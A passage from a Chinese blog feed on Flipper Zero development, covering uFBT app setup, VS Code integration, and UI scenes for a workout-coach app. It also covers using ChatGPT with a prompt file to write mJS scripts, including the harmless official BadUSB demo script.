title="接著開發"></a>接著開發</h2><p>首先我們用先用 <code>ufbt</code> 來創造開發環境：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">╰─ ufbt create APPID=test_app                                                                                       ─╯</span><br><span class="line">Checking <span class="keyword">for</span> tar..yes</span><br><span class="line">Checking <span class="keyword">if</span> downloaded toolchain tgz exists..no</span><br><span class="line">Checking curl..yes</span><br><span class="line">Downloading toolchain:</span><br><span class="line"><span class="comment">################################################################################################################ 100.0%</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">Removing old toolchain..done</span><br><span class="line">Unpacking toolchain to <span class="string">&#x27;/Users/kingkazma/.ufbt/toolchain&#x27;</span>:</span><br><span class="line"><span class="comment">##################################################################### 100.0%</span></span><br><span class="line">linking toolchain to <span class="string">&#x27;current&#x27;</span>..<span class="keyword">done</span></span><br><span class="line">Cleaning up..done</span><br><span class="line">scons: Entering directory `/Users/kingkazma/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fbt: warning: App folder &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach<span class="string">&#x27;: missing manifest (application.fam)</span></span><br><span class="line"><span class="string">LoadAppManifest, line 130, in file &quot;/Users/kingkazma/.ufbt/current/scripts/fbt_tools/fbt_apps.py&quot;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/test_app.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/test_app.png</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/application.fam<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Mkdir(&quot;/Users/kingkazma/Dolzma_Power_Coach/images&quot;)</span></span><br><span class="line"><span class="string">Touch(&quot;/Users/kingkazma/Dolzma_Power_Coach/images/.gitkeep&quot;)</span></span><br><span class="line"><span class="string">Copy(&quot;/Users/kingkazma/Dolzma_Power_Coach/.github&quot;, &quot;project_template/app_template/.github&quot;)</span></span><br></pre></td></tr></table></figure></div><p>然後我們就可以看到當前資料夾下有四個東西：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ <span class="built_in">ls</span>                                                                                                               ─╯</span><br><span class="line">application.fam images          test_app.c      test_app.png</span><br></pre></td></tr></table></figure></div><p>分別代表：</p><ul><li>application.fam<ul><li>app menifest, 關於 app 的細節</li></ul></li><li>images&#x2F;<ul><li>放圖片的資料夾</li></ul></li><li>test_app.c<ul><li>application 的原始碼</li></ul></li><li>test_app.png<ul><li>放 10x10 1-bit png icon 的地方</li></ul></li></ul><p>當我們要測試 app 的時候可以透過 <code>ufbt</code> 來編譯成一個 test_app.fap 位置在 dist&#x2F; 下面，我們可以把它上傳到 Flipper Zero SD card Examples&#x2F; 資料夾下面。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">╰─ ufbt                                                                                                             ─╯</span><br><span class="line">scons: Entering directory `/Users/kingkazma/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">ICONS/Users/kingkazma/.ufbt/build/test_app/test_app_icons.c</span></span><br><span class="line"><span class="string">CDB/Users/kingkazma/Dolzma_Power_Coach/.vscode/compile_commands.json</span></span><br><span class="line"><span class="string">CC/Users/kingkazma/Dolzma_Power_Coach/test_app.c</span></span><br><span class="line"><span class="string">CC/Users/kingkazma/.ufbt/build/test_app/test_app_icons.c</span></span><br><span class="line"><span class="string">LINK/Users/kingkazma/.ufbt/build/test_app_d.elf</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/dist/debug/test_app_d.elf</span></span><br><span class="line"><span class="string">APPMETA/Users/kingkazma/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">FAP/Users/kingkazma/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">FASTFAP/Users/kingkazma/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/dist/test_app.fap</span></span><br><span class="line"><span class="string">APPCHK/Users/kingkazma/.ufbt/build/test_app.fap</span></span><br><span class="line"><span class="string">Target: 7, API: 76.0</span></span><br></pre></td></tr></table></figure></div><h2 id="VScode-integration"><a href="#VScode-integration" class="headerlink" title="VScode integration"></a>VScode integration</h2><p>VScode 有一些好用的整合功能可以透過 ufbt 來下載讓我們開發更方便。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">╰─ ufbt vscode_dist                                                                                                 ─╯</span><br><span class="line">scons: Entering directory `/Users/kingkazma/.ufbt/current/scripts/ufbt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/c_cpp_properties.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/extensions.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/launch.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/settings.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Creating &#x27;</span>/Users/kingkazma/Dolzma_Power_Coach/.vscode/tasks.json<span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/.clang-format</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/.clangd</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/.editorconfig</span></span><br><span class="line"><span class="string">INSTALL/Users/kingkazma/Dolzma_Power_Coach/.gitignore</span></span><br><span class="line"><span class="string">CDB/Users/kingkazma/Dolzma_Power_Coach/.vscode/compile_commands.json</span></span><br></pre></td></tr></table></figure></div><p>現在 VScode 就可以我們前面載的 SDK 幫助我們檢查語法跟 highlighting，以及一些快捷鍵：</p><ul><li><code>Shift + Command + B</code> 可以顯示 build menu<ul><li><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/vscode_build.png"                      alt="build"                ></li></ul></li><li><code>Shift + Command + D</code> 可以顯示 debugging menu<ul><li>按了沒反應w</li></ul></li></ul><h2 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h2><p>在 instantiator.dev 的第二篇教學中的 UI 會有三個 scenes：</p><ul><li>main menu</li><li>popup1</li><li>popup2</li></ul><p>Flipper Zero 提供很多方式來構建應用程式的介面，其中最簡單的方式就是創建並註冊一個 <code>ViewPort</code>，然後註冊一個 redrawing function，當每次調用 <code>view_port_update</code> 的時候，這個函式就會執行。<br>雖然上面這種方式比較簡單，但是這沒辦法利用韌體中的所有元件，我們也需要自己設計介面，但這種方法在社群中還是蠻受歡迎的，特別是開發簡單的應用程式的時候。<br>這次的教學裡面作者會提到的是另一種開發 UI 的方式，支持簡化和管理更複雜的 UI 結構，而且利用到 Flipper 韌體中的各種 UI 元件。</p><h2 id="Scene-View"><a href="#Scene-View" class="headerlink" title="Scene &amp; View"></a>Scene &amp; View</h2><p>使用者介面可以分解成 View，每個 View 都是一個視覺元件，例如菜單、彈出視窗、文件瀏覽器、文本輸入等。<br>這次的教學裡會探討更多 Menu 跟 Popup 元件。<br>而 Scene 是 View 的上一層 abstraction，允許我們定義一組場景處理函數，這些函數會在我們載入場景的時候呈現視圖、退出時銷毀它。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>對今天的內容還是很少，緩慢推進中XD<br>我們會先透過 instantiator.dev 的教學文章熟悉開發 Flipper app 的流程，接著會開發之前說的健身海豚教練。<br>那就先醬，各位明天見！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-02/" >https://instantiator.dev/post/flipper-zero-app-tutorial-02/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-01/" >https://instantiator.dev/post/flipper-zero-app-tutorial-01/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://github.com/instantiator/flipper-zero-tutorial-app" >https://github.com/instantiator/flipper-zero-tutorial-app <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cover&quot;&gt;&lt;a href=&quot;#Cover&quot; class=&quot;headerlink&quot; title=&quot;Cover&quot;&gt;&lt;/a&gt;Cover&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day26 - 一鍵切換創造模式：從零開始打造專屬我的健身海豚教練</title>
    <link href="https://kazma.tw/2024/10/10/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day26/"/>
    <id>https://kazma.tw/2024/10/10/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day26/</id>
    <published>2024-10-10T14:08:46.405Z</published>
    <updated>2024-10-27T09:34:10.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://masterpiecer-images.s3.yandex.net/5fe3895bc157c4f:upscaled"                      alt="strong"                ><br>圖片來源：<a class="link"   href="https://shedevrum.ai/en/post/5fe3895bc157c4f/" >https://shedevrum.ai/en/post/5fe3895bc157c4f/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>嗨我是 Kazma。<br>我們在這次的鐵人賽挑戰中，涵蓋了攻擊到防守，也有包含內建應用程式到社群插件，所以是時候來動手寫一個自己生活中會用到的 App 了。<br>那關於要寫什麼 App 這幾天其實閃過很多念頭，最後決定做一個「健身海豚教練」，會想到這個主題主要是因為其實現在的手機很強大了，而且 Flipper 的內建功能和插件也算是很完整，所以如果要做一個相對實用的應用程式，就希望能盡量發揮不用手機的優勢，就在今天健身時意識到自己組間休常常滑手機到超時，或是課表不夠固定，或甚至會忘記做到第幾組。有了「健身海豚教練」我們就可以把課表包括重量和組數以及動作和組間休息時間都事先設定好，讓訓練可以更完整。而且也可以避免自己在組間休時拿手機出來滑導致超時，之後健身帶一個 Flipper 就可以了！</p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="關於開發一個-Flipper-App"><a href="#關於開發一個-Flipper-App" class="headerlink" title="關於開發一個 Flipper App"></a>關於開發一個 Flipper App</h2><p>首先我在網路上看到許多文章和影片都有提到這塊，所以我會把參考資料都附在最後，有興趣的各位可以去看看。<br>先從 instantiator.dev 的 <a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-01/" >Building an app for Flipper Zero, part 1: Getting started tutorial <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 開始，我們接下來有可能會用到作者使用到的工具，先介紹一下：</p><ul><li><a class="link"   href="https://github.com/flipperdevices/flipperzero-ufbt" >uFBT(micro Flipper Build Tool) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 是一個跨平台的 Flipper Zero 開發工具，是 Flipper Build Tool 的輕量版</li><li><a class="link"   href="https://code.visualstudio.com/" >Visual Studio Code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 一個很強大的編輯器和 IDE</li><li><a class="link"   href="https://www.pinta-project.com/" >Pinta <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 免費開源的繪圖工具</li></ul><h2 id="開搞"><a href="#開搞" class="headerlink" title="開搞"></a>開搞</h2><p>首先我們先創個資料夾之後進去：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> Dolzma_Power_Coach</span><br><span class="line"><span class="built_in">cd</span> Dolzma_Power_Coach</span><br></pre></td></tr></table></figure></div><p>接著我們要透過 uFBT 去下載最新的 Software Development Kit (SDK)，我們載的 SDK 是符合 dev 版本的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufbt update --channel=dev</span><br></pre></td></tr></table></figure></div><p>這邊載 dev 是因為他有比較多安全保護機制，可以幫我們提前識別某些錯誤，像是 <code>furi_assert</code>，他會幫我我們在程式有問題的時候讓他停下來。<br>然後既然我們用 dev 版本的官方韌體來開發，我們 Flipper 肯定也是要用開發版的韌體，所以這邊用 qFlipper 安裝。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dev_firm.jpg"                      alt="dev"                ></p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>這個開發的內容可能會持續三到五天，所以這幾天會一步步把我們的 “Dolzma Power Coach” 給開發出來，包含畫圖那些，希望最後可以有一個完整的成品放到 Flipper App Store，那今天就先到這邊，各位明天見！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://www.reddit.com/r/flipperzero/comments/13a38wy/a_short_tutorial_for_firsttime_flipper_app/" >https://www.reddit.com/r/flipperzero/comments/13a38wy/a_short_tutorial_for_firsttime_flipper_app/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-01/" >https://instantiator.dev/post/flipper-zero-app-tutorial-01/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cover&quot;&gt;&lt;a href=&quot;#Cover&quot; class=&quot;headerlink&quot; title=&quot;Cover&quot;&gt;&lt;/a&gt;Cover&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day25 - 基於生成式預訓練模型之 mJS 腳本開發：探討 ChatGPT 在 Flipper Zero 自動化中的應用</title>
    <link href="https://kazma.tw/2024/10/09/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day25/"/>
    <id>https://kazma.tw/2024/10/09/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day25/</id>
    <published>2024-10-09T14:20:49.032Z</published>
    <updated>2024-10-27T09:33:47.227Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在今年 9 月 10 號的時候，我看到 Flipper 官網發了一篇部落格是關於他們的韌體終於進入 1.0 版本了，也列出目前的版有的標誌性功能：<br><a class="link"   href="https://blog.flipper.net/released-firmware-1/" >Firmware 1.0 Released <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://blog.flipper.net/content/images/size/w1600/2024/09/Flipper_Zero_Firmware_1.0_whats_new_02--1-.png"                      alt="blog"                ><br>圖片來源：<a class="link"   href="https://blog.flipper.net/released-firmware-1/" >https://blog.flipper.net/released-firmware-1/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>其中讓我比較感興趣的是發現他可以執行 JaveScript，於是就嘗試寫了一個簡單的 hello.js 嘗是在螢幕上印出 “Hello World”，如下：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// helloWorld.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br></pre></td></tr></table></figure></div><p>但後來卻失敗了，也沒找到時間繼續嘗試，結果這幾天在 YT 看到 Derek Jamison 有一集是關於他訓練 GPT 去撰寫 Flipper 可以執行的 JS，於是有了今天的內容。<br>影片網址：<a class="link"   href="https://youtu.be/5U26CU_j2tE?si=P1PENjpoujiw_-TA" >https://youtu.be/5U26CU_j2tE?si=P1PENjpoujiw_-TA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="JavaScript-on-Flipper-Zero"><a href="#JavaScript-on-Flipper-Zero" class="headerlink" title="JavaScript on Flipper Zero"></a>JavaScript on Flipper Zero</h2><p>在剛剛提到的官方更新文章中，只有看到一段介紹：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://blog.flipper.net/content/images/size/w1600/2024/09/Flipper_Zero_JavaScript_support_new.png"                      alt="copy"                ><br>圖片來源：<a class="link"   href="https://blog.flipper.net/released-firmware-1/" >https://blog.flipper.net/released-firmware-1/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p>JavaScript support is based on the mJS scripting engine. Originally designed for microcontrollers, mJS utilizes system resources efficiently and operates relatively quickly. It requires less than 50k of flash space and 2k of RAM.</p></blockquote><p>前面有提到 script 資料夾下面有 examples 以及上面這段敘述有提到 Flipper 用的是 mJS，一種針對微控制器的腳本引擎，對系統資源的利用即為高效，執行速度也相對快。<br>簡單來說 mJS 就是很輕的 JS，特別適合 Flipper 這種記憶體和處理能力有限的裝置使用。</p><p>範例中包括像是 <code>basusb_demo.js</code>:</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> badusb = <span class="built_in">require</span>(<span class="string">&quot;badusb&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> notify = <span class="built_in">require</span>(<span class="string">&quot;notification&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> flipper = <span class="built_in">require</span>(<span class="string">&quot;flipper&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> dialog = <span class="built_in">require</span>(<span class="string">&quot;dialog&quot;</span>);</span><br><span class="line"></span><br><span class="line">badusb.<span class="title function_">setup</span>(&#123;</span><br><span class="line">    <span class="attr">vid</span>: <span class="number">0xAAAA</span>,</span><br><span class="line">    <span class="attr">pid</span>: <span class="number">0xBBBB</span>,</span><br><span class="line">    <span class="attr">mfr_name</span>: <span class="string">&quot;Flipper&quot;</span>,</span><br><span class="line">    <span class="attr">prod_name</span>: <span class="string">&quot;Zero&quot;</span>,</span><br><span class="line">    <span class="attr">layout_path</span>: <span class="string">&quot;/ext/badusb/assets/layouts/en-US.kl&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line">dialog.<span class="title function_">message</span>(<span class="string">&quot;BadUSB demo&quot;</span>, <span class="string">&quot;Press OK to start&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (badusb.<span class="title function_">isConnected</span>()) &#123;</span><br><span class="line">    notify.<span class="title function_">blink</span>(<span class="string">&quot;green&quot;</span>, <span class="string">&quot;short&quot;</span>);</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;USB is connected&quot;</span>);</span><br><span class="line"></span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;CTRL&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;CTRL&quot;</span>, <span class="string">&quot;c&quot;</span>);</span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;DOWN&quot;</span>);</span><br><span class="line">    <span class="title function_">delay</span>(<span class="number">1000</span>);</span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;CTRL&quot;</span>, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">    <span class="title function_">delay</span>(<span class="number">1000</span>);</span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;CTRL&quot;</span>, <span class="string">&quot;v&quot;</span>);</span><br><span class="line"></span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;1234&quot;</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;Flipper Model: &quot;</span> + flipper.<span class="title function_">getModel</span>());</span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;Flipper Name: &quot;</span> + flipper.<span class="title function_">getName</span>());</span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;Battery level: &quot;</span> + <span class="title function_">to_string</span>(flipper.<span class="title function_">getBatteryCharge</span>()) + <span class="string">&quot;%&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Alt+Numpad method works only on Windows!!!</span></span><br><span class="line">    badusb.<span class="title function_">altPrintln</span>(<span class="string">&quot;This was printed with Alt+Numpad method!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// There&#x27;s also badusb.print() and badusb.altPrint()</span></span><br><span class="line">    <span class="comment">// which don&#x27;t add the return at the end</span></span><br><span class="line"></span><br><span class="line">    notify.<span class="title function_">success</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;USB not connected&quot;</span>);</span><br><span class="line">    notify.<span class="title function_">error</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Optional, but allows to interchange with usbdisk</span></span><br><span class="line">badusb.<span class="title function_">quit</span>();</span><br></pre></td></tr></table></figure></div><p>總之就是跟一般的 JS 有一點差距，於是我們如果想用 ai 幫我寫一些 Flipper 能夠執行的腳本的話，需要先進行訓練。</p><h2 id="Train"><a href="#Train" class="headerlink" title="Train"></a>Train</h2><p>其中 Derek 提供了一個他做的 GitHub Repo 可以幫助我們訓練 GPT 其中包含一段 intro.txt 以及三個 train.js，用法就是把 train.js 都丟給 GPT 然後放上 intro.txt 的描述後加上我們的需求例如下面的方式放上去：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/train.png"                      alt="train"                ><br>其中 <code>intro.txt</code> 的內容如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Flipper Zero JavaScript is based on the mJS engine, which is fairly restricted.  For example:</span><br><span class="line">- You must use the `let` keyword.  `const` and `var` are not allowed.</span><br><span class="line">- You cannot do string interpolation with the `$`.</span><br><span class="line">- You must use `let Math = require(&quot;math&quot;);` if you need access to any of the Math functions.</span><br><span class="line">- You must use `to_string` to convert numerics (like integer and float) into a string.</span><br><span class="line">- When keyboard.text display the on-screen keyboard, it covers the entire screen (so you can&#x27;t see any previously printed information).</span><br><span class="line">- All files are stored on the SD Card under the `/ext/` subdirectory.</span><br><span class="line">- Delays are always measured in milliseconds and use the built-in `delay` function.</span><br><span class="line">- Uint8Array(buffer) instead of `new Uint8Array(buffer)`.  Objects like `String` do not exist.  See arraybuf_to_string for code that should be used when converting a buffer into a string.</span><br><span class="line">- There is no split or trim functions build in for strings.  &quot;1,2&quot;.split(&quot;,&quot;); and &quot;x  &quot;.trim(); will generate runtime errors.</span><br><span class="line">- See the training file for how to use the to_upper_case, to_lower_case, parse_int.  You can get the ascii value of a character in a string using charCodeAt and also convert an ascii value back to a char using chr; see training file for details.</span><br><span class="line">- Console.log prints to the serial port debugger, as an [I]nfo.  Console.error prints to the serial port debugger, as an [E]rror.  The print method writes to the Flipper display.</span><br><span class="line">- Functions must be declared before they are used, but typically after all of the require statements.</span><br><span class="line"></span><br><span class="line">Attached are three sample JavaScript files that work on the Flipper Zero.</span><br><span class="line"></span><br><span class="line">You should only use functions defined in the training file, no additional built-in commands are supported.  You should not redefine any function that is used in the training file.</span><br></pre></td></tr></table></figure></div><p>在失敗幾次後，終於成功，他給我的檔案如下：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> widget = <span class="built_in">require</span>(<span class="string">&quot;widget&quot;</span>);</span><br><span class="line"></span><br><span class="line">widget.<span class="title function_">show</span>();</span><br><span 